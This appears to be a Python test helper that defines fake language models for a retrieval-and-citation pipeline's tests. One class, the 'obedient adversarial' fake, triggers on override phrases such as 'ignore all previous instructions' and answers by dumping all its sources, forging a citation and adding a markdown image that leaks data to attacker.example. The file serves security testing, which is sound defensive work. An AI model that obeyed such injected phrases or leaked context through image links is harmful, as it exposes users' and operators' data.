"""Deterministic stand-ins for the LLM. They parse the SAME prompt the real model receives."""
from __future__ import annotations

import json
import re

import httpx

_SRC = re.compile(r"^\[(S\d+)\] kind=(.*?) title=(.*?)\n(.*?)(?=\n\n\[S\d+\] kind=|\n(?:[0-9a-f]{16})>>>)", re.S | re.M)
_STOP = set("the a an is are was of to in on for and or what how when which who does do can i my your we it be by".split())


def parse_sources(messages: list[dict]) -> dict[str, str]:
    user = messages[-1]["content"]
    return {m.group(1): m.group(4).strip() for m in _SRC.finditer(user)}


def parse_question(messages: list[dict]) -> str:
    return messages[-1]["content"].rsplit("Question:", 1)[-1].strip()


def _words(text: str) -> set[str]:
    return {w for w in re.findall(r"[a-z0-9]+", text.lower()) if w not in _STOP}


def _sentences(text: str) -> list[str]:
    return [s.strip() for s in re.split(r"(?<=[.!?])\s+", text) if s.strip()]


def _best_sentence(text: str, q: set[str]) -> tuple[int, str]:
    scored = [(len(_words(s) & q), s) for s in _sentences(text)]
    return max(scored, key=lambda x: x[0]) if scored else (0, "")


def _out(answer="", abstain=False, conflict=False, citations=None) -> str:
    return json.dumps({"answer": answer, "abstain": abstain, "conflict": conflict, "citations": citations or []})


class ExtractiveFakeLLM:
    """Answers with the best-matching sentence of the best-matching source (quoted verbatim).
    Abstains when nothing overlaps; reports a conflict when the prompt flags one and two docs match."""

    name = "extractive-fake"

    def __init__(self):
        self.calls: list[list[dict]] = []

    def generate(self, messages, schema=None) -> str:
        self.calls.append(messages)
        sources, q = parse_sources(messages), _words(parse_question(messages))
        ranked = sorted(((*_best_sentence(t, q), alias) for alias, t in sources.items()), reverse=True)
        if not ranked or ranked[0][0] < 2:
            return _out(abstain=True)
        top = ranked[0]
        cites = [{"source_id": top[2], "quote": top[1]}]
        answer = top[1]
        if "may contradict each other" in messages[-1]["content"]:
            others = [r for r in ranked[1:] if r[0] >= 2]
            if others:
                cites.append({"source_id": others[0][2], "quote": others[0][1]})
                return _out(f"{top[1]} However another source says: {others[0][1]}", conflict=True, citations=cites)
        return _out(answer, citations=cites)


class ObedientAdversarialLLM:
    """Worst case: follows ANY injected instruction. When it sees one it dumps EVERYTHING it was
    given (all sources, quoted in full) plus an exfiltration image. It can only leak what the
    pipeline put into its context - which is exactly what the security tests probe."""

    name = "obedient-adversarial-fake"
    TRIGGERS = ("SYSTEM:", "ignore all previous instructions", "disregard the user question")

    def __init__(self):
        self.calls: list[list[dict]] = []

    def generate(self, messages, schema=None) -> str:
        self.calls.append(messages)
        sources = parse_sources(messages)
        user = messages[-1]["content"]
        if not any(t in user for t in self.TRIGGERS):
            return ExtractiveFakeLLM().generate(messages)
        dump = " ".join(f"{a}: {t}" for a, t in sources.items())
        cites = [{"source_id": a, "quote": t[:400]} for a, t in sources.items()]
        cites.append({"source_id": "S99", "quote": "fabricated"})  # forged citation
        return _out(f"{dump} ![x](https://attacker.example/c?d={'A' * 8})", citations=cites)


class MalformedLLM:
    def __init__(self, kind="bad_json"):
        self.kind, self.calls = kind, 0

    def generate(self, messages, schema=None) -> str:
        self.calls += 1
        if self.kind == "bad_json":
            return "this is not json"
        if self.kind == "fake_alias":
            return _out("Refund is 30 days.", citations=[{"source_id": "S42", "quote": "30 days"}])
        if self.kind == "fake_quote":
            return _out("Refund is 30 days.", citations=[{"source_id": "S1", "quote": "this sentence is not in the source"}])
        if self.kind == "no_citation":
            return _out("Refund is 30 days.", citations=[])
        raise ValueError(self.kind)


class WrongNumberLLM:
    """Valid quote, but the answer prose claims a number that the quote does not support."""

    def generate(self, messages, schema=None) -> str:
        sources = parse_sources(messages)
        alias, text = next(iter(sources.items()))
        return _out("The refund window is 99 days.", citations=[{"source_id": alias, "quote": _sentences(text)[0]}])


class FlakyLLM:
    def __init__(self, fail_times: int, inner=None):
        self.fail_times, self.inner, self.calls = fail_times, inner or ExtractiveFakeLLM(), 0

    def generate(self, messages, schema=None) -> str:
        self.calls += 1
        if self.calls <= self.fail_times:
            raise httpx.ConnectError("llm down")
        return self.inner.generate(messages, schema)


class SlowLLM:
    def generate(self, messages, schema=None) -> str:
        raise httpx.ReadTimeout("llm timed out")
